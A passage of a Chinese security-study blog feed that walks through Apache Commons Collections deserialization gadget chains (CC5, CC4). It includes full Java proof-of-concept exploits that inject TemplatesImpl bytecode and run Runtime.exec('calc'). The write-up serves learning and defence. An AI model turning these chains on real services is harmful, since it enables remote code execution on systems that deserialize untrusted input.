hashset.add(tme);</span><br><span class="line">        lzmap.clear();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(c,transformers);</span><br><span class="line"> </span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(hashset);</span><br><span class="line">        oos.close();</span><br><span class="line"> </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用成功</p><p><img src="https://bu.dusays.com/2024/06/07/66630b221c456.png" alt="image-20240530014510237"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--CC5</title>
      <link href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5/"/>
      <url>/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC5/</url>
      
        <content type="html"><![CDATA[<h1 id="java反序列化–CC5"><a href="#java反序列化–CC5" class="headerlink" title="java反序列化–CC5"></a>java反序列化–CC5</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>同样 重点分析链子</p><p>CC5可以在<code>Commons-Collections=3.2.1</code>与<code>Commons-Collections=4.0</code></p><p>下都可以运行 包括在8u401和8u65下都可以运行</p><p>但是 和CC1等在<code>Commons-Collections=4.0</code>的运行一样 改动的地方也是一样的</p><p><strong>但是有这个前置条件：3.1&gt;Common-Collection&lt;&#x3D;3.2.1</strong>&amp;&amp;<strong>Commons-Collections&#x3D;4.0</strong></p><p>CC5和CC1很像</p><p>CC1的链子是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><p>而CC5的链子是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        TiedMapEntry.toString()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">                ChainedTransformer.transform()</span><br><span class="line">                    ConstantTransformer.transform()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Class.getMethod()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.getRuntime()</span><br><span class="line">                    InvokerTransformer.transform()</span><br><span class="line">                        Method.invoke()</span><br><span class="line">                            Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>基本一样的不是</p><p>与其说是CC5 我个人认为不如说变异的CC1</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>同样 直接先上POC吧</p><p>这里我是在<code>8u401+Commons-Collections=4.0</code>下的结果</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造核心利用代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造利用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发连</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazymap</span> <span class="operator">=</span> (LazyMap) LazyMap.lazyMap(hashMap, chain);</span><br><span class="line">        <span class="comment">//将lazyMap传给TiedMapEntry</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//反射调用TiedMapEntry</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(bad,entry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化  --&gt;  反序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(bad);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没问题哈</p><p><img src="https://bu.dusays.com/2024/06/07/66630aed687fb.png" alt="image-20240605201426807"></p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>通过POC 我们可以看到</p><p>CC5在构造触发链时还是用到了LazyMap类，但不同的是使用了一个新的类<strong>TiedMapEntry</strong>来调用(CC6的)LazyMap链，然后将TiedMapEntry类又传给了<strong>BadAttributeValueExpException</strong>类的val属性</p><p>来看看<strong>TiedMapEntry</strong>是个怎么个事</p><p>我们只需要按照CC1的思路来分析这条链子就行</p><p>我们可以看到<code>TiedMapEntry</code>是实现了<code>Serializable</code>接口的</p><p><img src="https://bu.dusays.com/2024/06/07/66630aeacbaec.png" alt="image-20240605201930542"></p><p>并且在getValue方法并通过map属性调用了一个<strong>get</strong>方法</p><p><img src="https://bu.dusays.com/2024/06/07/66630aea9e2cc.png" alt="image-20240605202126900"></p><p>而map属性是通过TiedMapEntry类的构造来赋值的（map属性是<strong>可控的</strong>），可以把LazyMap当做TiedMapEntry类的构造参数传给map属性。</p><p><img src="https://bu.dusays.com/2024/06/07/66630aeaa92d5.png" alt="image-20240605202313939"></p><p>只需要控制 this.map &#x3D; 我们的 hashMap 即可</p><p>这样就可以让TiedMapEntry类map属性来间接调用LazyMap类的get方法，从而触发之前构造的利用链了。</p><p>而getValue方法是在toString方法中被调用</p><p><img src="https://bu.dusays.com/2024/06/07/66630aea9e6ee.png" alt="image-20240605203006059"></p><p>注：以上方法都是在TiedMapEntry类哈</p><p>那么怎么调用toString呢</p><p>我们找到一个类必须满足以下条件：</p><ul><li><p>重写readObject方法</p></li><li><p>并在readObject方法中可以调用toString方法（并且调用toString方法的对象是可控的）</p></li></ul><p>这样就找到了<strong>BadAttributeValueExpException类</strong></p><p><img src="https://bu.dusays.com/2024/06/07/66630aeb0b07f.png" alt="image-20240605203750335"></p><p>readObject方法表示从输入流中读取字段，然后gf对象调用了get方法读取val属性，然后又调用了toString方法，<strong>val的内容同样是可控的</strong>，因此这里可以通过反射将val属性设置为TiedMapEntry类，这样就可以调用TiedMapEntry类的toString方法了，这样就可以触发利用链和核心利用代码。</p><p>链子通了</p><p>后续就是一样的了</p><p>就不分析了</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
            <tag> CC链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化--CC4</title>
      <link href="/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4/"/>
      <url>/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4/</url>
      
        <content type="html"><![CDATA[<h1 id="java反序列化–CC4"><a href="#java反序列化–CC4" class="headerlink" title="java反序列化–CC4"></a>java反序列化–CC4</h1><p>我们后面学习的CC4、CC5、CC7据说实用价值比较低了</p><p>但是我们还是要学习 毕竟我们的java调试 审计能力还不够 </p><p>继续提升我们的java能力吧</p><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Commons-Collections&#x3D;4.0</li><li>javassist</li></ul><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p><strong>其实CC4就是CC2与CC3的组合体</strong></p><p>基于TransformingComparator+priorityqueue是可以触发transforme()方法</p><p>所以可以利用这个两个类的组合来代替cc3链中的LazyMap或Transformedmmap+AnnotationinvocationHandler的组合,从而构成了cc4</p><p>直接上POC</p><p>通过POC来学习就行</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 此类演示了利用Common Collections 4 (CC4)漏洞进行攻击的方法，</span></span><br><span class="line"><span class="comment"> * 能够通过操纵优先队列的比较器实现远程代码执行。</span></span><br><span class="line"><span class="comment"> * 它创建了一个恶意的TemplatesImpl对象，并将其置于变换器链中，</span></span><br><span class="line"><span class="comment"> * 最终在反序列化优先队列时触发代码执行。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 辅助方法，用于设置对象私有字段的值。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> obj 需要设置字段值的对象。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name 字段名称。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value 字段的新值。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception 访问或设置字段时可能出现的异常。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 初始化Javassist的类池以进行字节码操作</span></span><br><span class="line">        ClassPool cp=ClassPool.getDefault();</span><br><span class="line">        cp.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个新的类，继承自AbstractTranslet，在初始化时执行任意代码</span></span><br><span class="line">        CtClass cc=cp.makeClass(<span class="string">&quot;VV&quot;</span>);</span><br><span class="line">        cc.setSuperclass(cp.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 将恶意类转换为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytes=cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建并配置TemplatesImpl对象以包含恶意字节码</span></span><br><span class="line">        TemplatesImpl templates= <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;VV&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建变换器链，包含将常量转换为TrAXFilter实例的过程</span></span><br><span class="line">        ChainedTransformer chained=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用变换器链创建比较器</span></span><br><span class="line">        TransformingComparator trans=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chained);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建优先队列并设置恶意比较器</span></span><br><span class="line">        PriorityQueue prior=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        prior.add(<span class="number">1</span>);</span><br><span class="line">        prior.add(<span class="number">2</span>);</span><br><span class="line">        setValue(prior,<span class="string">&quot;comparator&quot;</span>,trans);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化优先队列</span></span><br><span class="line">        ByteArrayOutputStream bao=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(prior);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化触发代码执行</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>((<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bao.toByteArray())));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没问题哈</p><p><img src="https://bu.dusays.com/2024/06/07/66630abe4912a.png" alt="image-20240605165836041"></p><p>其实链子还是比较熟悉的吧</p><p>基本上都是前几条链子都见过的东西了</p><p>通过 <code>PriorityQueue</code> 与 <code>TransformingComparator</code> 的配合触发 <code>ChainedTransformer</code> 中的 <code>transform</code> 方法，使我们的恶意类字节码注册到 JVM 中并实例化，触发构造函数中的 Runtime 方法达成 RCE</p><p>链子流程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure><p>感觉也没什么好说的了</p><h3 id="小变异POC"><a href="#小变异POC" class="headerlink" title="小变异POC"></a>小变异POC</h3><p>前面的POC是直接调用了exec.exe</p><p>我们可以将POC稍微改动一下 来调用本地的任意class文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC44</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">te</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">namefield</span> <span class="operator">=</span> te.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefield.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesield</span> <span class="operator">=</span> te.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;D://CODE//JAVA//TEXT//src//evilClass.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodesield.set(templates,codes);<span class="comment">//到了代码执行的地方了，需要将执行的命令传进去</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//避免被readObject修改</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerfield.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装serialize</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装unserialize</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然 我们需要一个恶意class文件</p><p>写一个恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="comment">//需要继承AbstractTranslet,因为在defineTransletClasses中会判断是否继承了这个类没有会报错</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">evilClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//两种触发方式构造方法和静态代码块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span 